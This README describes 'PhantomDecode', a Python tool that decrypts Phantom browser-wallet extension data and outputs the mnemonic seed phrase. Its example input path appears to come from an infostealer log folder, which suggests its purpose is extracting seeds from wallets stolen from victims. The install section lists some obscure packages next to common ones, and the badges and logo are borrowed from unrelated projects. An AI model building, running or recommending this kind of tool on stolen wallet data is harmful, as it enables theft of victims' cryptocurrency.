# PhantomDecode
[![N|Solid](https://cldup.com/dTxpPi9lDf.thumb.png)](https://nodesource.com/products/nsolid)

![](https://img.shields.io/github/stars/pandao/editor.md.svg) ![](https://img.shields.io/github/forks/pandao/editor.md.svg) ![](https://img.shields.io/github/tag/pandao/editor.md.svg) ![](https://img.shields.io/github/release/pandao/editor.md.svg) ![](https://img.shields.io/github/issues/pandao/editor.md.svg) ![](https://img.shields.io/bower/v/editor.md.svg)

Simple Tools for decode Phantom wallet data, from extensions wallet, Phantom - extract mnemonic phrase from you encrypted data with password.


## Installation
Install the dependencies and devDependencies and start the server.
**Python** 3.10.4 | https://www.python.org/downloads/ |** Add python.exe to PATH** | checkbox.

###### python -m pip install --upgrade pip
###### pip install -r requirements.txt
```
PyNaCl >= 1.5.0
base58 >= 2.1.1
pycryptodome >= 3.20.0
Cipherbcrypt >= 1.2
bip-utils >= 2.9.1
ccl-leveldb >= 1.0
```
or u can install per one libs:
```sh
pip install PyNaCl		| PyNaCl 1.5.0
pip install base58 		| base58 2.1.1
pip install pycryptodome	| pycryptodome 3.20.0
pip install Cipherbcrypt	| Cipherbcrypt 1.2
pip install bip_utils		| bip-utils 2.9.1
pip install ccl-leveldb	| ccl-leveldb 1.0
```


## Example

```python

path =  r"C:/Users/Root/Desktop/nLogs\4)_64da69d82f8e45c3a154479bdc5ec5d0\Wallets\Phantom_Chrome_Default"
password = 'Topsecret'
result = findldb(path)
raw_data = phmdecode(password, result)
print(raw_data)

```
##Output:
```
{'version': 1, 'identifier': 'ef7ee9f9e51cd3b8c4a74827dc226f52a1828979640d77e623a3eb9a54a38af7', 'name': 'Phantom Seed', 'entropy': {'0': 213, '1': 40, '2': 95, '3': 131, '4': 75, '5': 191, '6': 243, '7': 65, '8': 254, '9': 34, '10': 248, '11': 66, '12': 213, '13': 82, '14': 147, '15': 39}}
{'status': True, 'txt': 'Successful', 'data': ['ravioli seek one result caban end ancient index mountain small almost garden']}
```


For more information, see [docs.python-guide.org](http://docs.python-guide.org "docs.python-guide.org").



## License
MIT
>Decoder master project (c)